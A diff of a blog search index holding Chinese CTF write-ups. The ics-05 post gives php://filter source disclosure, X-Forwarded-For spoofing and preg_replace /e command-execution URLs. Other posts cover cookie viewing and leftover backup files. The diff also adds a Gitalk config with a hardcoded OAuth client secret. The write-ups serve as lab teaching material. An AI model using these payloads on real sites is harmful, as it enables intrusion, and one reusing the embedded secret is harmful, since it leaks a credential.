@@ -1,20 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title><![CDATA[post-boko1]]></title>
-      <url>/2019/12/24/post-boko1/</url>
-      <content type="html"><![CDATA[<p>— title: post_boko1 date: 2019-12-24 11:06:00 tags: — </p>
+<search>
+  <entry>
+    <title>post-boko1</title>
+    <url>/2019/12/24/post-boko1/</url>
+    <content><![CDATA[<p>— title: post_boko1 date: 2019-12-24 11:06:00 tags: — </p>
 ]]></content>
-      
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[CTF攻防世界-WEB-cis05]]></title>
-      <url>/2019/12/24/ctf-ics-05/</url>
-      <content type="html"><![CDATA[<div class="note info"><p>0x01 前要</p></div>
+  </entry>
+  <entry>
+    <title>CTF攻防世界-WEB-cis05</title>
+    <url>/2019/12/24/ctf-ics-05/</url>
+    <content><![CDATA[<div class="note info"><p>0x01 前要</p></div>
 
 <p>1.<a href="https://www.cnblogs.com/likai/archive/2010/01/29/1659336.html" target="_blank">php内置封装协议 filter</a><br>2.伪造IP<br>3.preg_replace()函数的/e漏洞<br>4.正确的php system()函数的书写</p>
  <a id="more"></a>
@@ -31,27 +26,27 @@
 </ol>
 <br>
 2_1.
- <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=<span class="string">"layui-nav-item layui-this"</span>&gt;&lt;a href=<span class="string">"?page=index"</span>&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div>
+ <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&lt;li class=<span class="string">"layui-nav-item layui-this"</span>&gt;&lt;a href=<span class="string">"?page=index"</span>&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div>
 2_2.为了能够正常读取到内置文件的内容，所以采用base64模式提前将php内置文件源码我们所需的部分转化为base64形式，取得代码后在线转码即可获得源码。
- <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>
+ <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>
 
 <p><img src="2.PNG" alt=""></p>
 <br>
 
 <p>3.转码获得源码</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
 <p>3_1.代码审计<br>（1）我们需要从127.0.0.1 IP地址登陆，使用Burp Suite伪造html头IP<br>（1_1）可以看到我们登陆成功<br><img src="3.PNG" alt=""></p>
 <p>（2）<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>    简单的说明一下preg_replace（）函数，详细的说明以及示例可以点击超链接，阅读另一位博主的详细说明</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_replace (<span class="variable">$pattern</span> , <span class="variable">$replacement</span> ,  <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="variable">$pattern</span>:       搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"><span class="variable">$replacement</span>:   用于替换的字符串或字符串数组。</span><br><span class="line"><span class="variable">$subject</span>:       要搜索替换的目标字符串或字符串数组。</span><br><span class="line">关于/e：</span><br><span class="line"> 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。</span><br><span class="line"> 潜在威胁： 当replacement为可控时，可以直接编写一句话木马</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">preg_replace (<span class="variable">$pattern</span> , <span class="variable">$replacement</span> ,  <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="variable">$pattern</span>:       搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"><span class="variable">$replacement</span>:   用于替换的字符串或字符串数组。</span><br><span class="line"><span class="variable">$subject</span>:       要搜索替换的目标字符串或字符串数组。</span><br><span class="line">关于/e：</span><br><span class="line"> 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。</span><br><span class="line"> 潜在威胁： 当replacement为可控时，可以直接编写一句话木马</span><br></pre></td></tr></table></figure></div>
 <p>（2_2）利用漏洞寻找flag<br>    %20代表空格，%26%26就是&amp;&amp;代表当前面命令执行成功时，继续执行后面的命令</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
 <p><img src="4.PNG" alt=""></p>
 <p>(2_3)根据文件目录，查看可疑文件layui和s3chahahaDir，通过cd到文件夹，查看文件内容，最终确认为s3chahahaDir文件夹</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
 <p><img src="5.PNG" alt=""><br>（2_4）找到flag文件夹后，继续cd，寻找所需的flag</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir/flag%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir/flag%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
 <p><img src="6.PNG" alt=""><br>(2_5)确认flag所在的文件，直接抓取内容</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cat%20s3chahahaDir/flag/flag.php"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cat%20s3chahahaDir/flag/flag.php"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
 <p><img src="7.PNG" alt=""><br>成功找到flag</p>
 <div class="note info"><p>0x03 解题过程中存在的问题</p></div>
 1.Burp Suite存在复制黏贴产生报错结果，建议可以手打重新尝试
@@ -82,59 +77,54 @@
   })
   gitment.render('container')
 </script>]]></content>
-      
-        <categories>
-            
-            <category> CTF-WEB </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> php内置filter协议 </tag>
-            
-            <tag> 伪造IP </tag>
-            
-            <tag> preg_replace()函数的/e漏洞 </tag>
-            
-            <tag> 正确的php system()函数的书写 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[CTF攻防世界-WEB-cookie基础题]]></title>
-      <url>/2019/12/24/pb%E5%9F%BA%E7%A1%80/</url>
-      <content type="html"><![CDATA[<div class="note info"><p>0x01 攻防世界web新手区cookie题</p></div>
+      <categories>
+        <category>CTF-WEB</category>
+      </categories>
+      <tags>
+        <tag>php内置filter协议</tag>
+        <tag>伪造IP</tag>
+        <tag>preg_replace()函数的/e漏洞</tag>
+        <tag>正确的php system()函数的书写</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF攻防世界-WEB-cookie基础题</title>
+    <url>/2019/12/24/pb%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<div class="note info"><p>0x01 攻防世界web新手区cookie题</p></div>
     常规网上搜到的都是用burp suits做的，其实没必要这么麻烦，查看问题的讨论发现可以直接通过火狐浏览器 F12查看存储，获得cookie，然后查看网络获得flag <br>
     Chrome浏览器可以通过控制台输入alert(document.cookie)查看cookie cookie
 <div class="note info"><p>0x02 图流程</p></div>
 
 <p><img src="2.png" alt=""></p>
 <p><img src="1.png" alt=""></p>
+<!-- Link Gitalk 的支持文件  -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
+<div id="gitalk-container"></div>     <script type="text/javascript">
+    var gitalk = new Gitalk({
+
+<pre><code>// gitalk的主要参数
+    clientID: `dcf239aa6b46fcf244a3`,
+    clientSecret: `2b92cc0f958358e2c10b5fb8746381c15f5ee29d`,
+    repo: `MR-eggegg.github.io`,
+    owner: &apos;MR-eggegg&apos;,
+    admin: [&apos;MR-eggegg&apos;],
+    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,
+
+});
+gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
 ]]></content>
-      
-        <categories>
-            
-            <category> CTF-WEB基础 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 抓包基础题 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[低估的Web威胁-备份文件]]></title>
-      <url>/2019/12/24/%E4%BD%8E%E4%BC%B0%E7%9A%84Web%E5%A8%81%E8%83%81/</url>
-      <content type="html"><![CDATA[<div class="note info"><p>0x01代码编辑器产生的备份文件</p></div>
+      <categories>
+        <category>CTF-WEB基础</category>
+      </categories>
+      <tags>
+        <tag>抓包基础题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>低估的Web威胁-备份文件</title>
+    <url>/2019/12/24/%E4%BD%8E%E4%BC%B0%E7%9A%84Web%E5%A8%81%E8%83%81/</url>
+    <content><![CDATA[<div class="note info"><p>0x01代码编辑器产生的备份文件</p></div>
     文本编辑器和代码编辑器通常对正在编辑的文件会事先产生一个备份文件，这样做的目的是让出问题后可以恢复文件。
     例如：对一个名为index.php的文件进行编辑，自动创建的备份文件将会被命名成“index.php.save”。其他的代码编辑器也是一样的，都有一套自己的备份规则。
 <div class="note danger"><p>0x02没有删除版本控制系统产生的备份文件</p></div>
@@ -150,26 +140,14 @@
 
 
 
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># gif 二进制转字符串</span></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">a = <span class="string">'01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101'</span></span><br><span class="line">b = re.findall(r<span class="string">'.&#123;8&#125;'</span>,a)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += chr(int(i,2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gif 二进制转字符串</span></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">a = <span class="string">'01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101'</span></span><br><span class="line">b = re.findall(r<span class="string">'.&#123;8&#125;'</span>,a)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag += chr(int(i,2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
 ]]></content>
-      
-        <categories>
-            
-            <category> web安全 </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> 备份文件 </tag>
-            
-            <tag> CTF-WEB基础知识 </tag>
-            
-        </tags>
-        
-    </entry>
-    
-  
-  
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>备份文件</tag>
+        <tag>CTF-WEB基础知识</tag>
+      </tags>
+  </entry>
 </search>
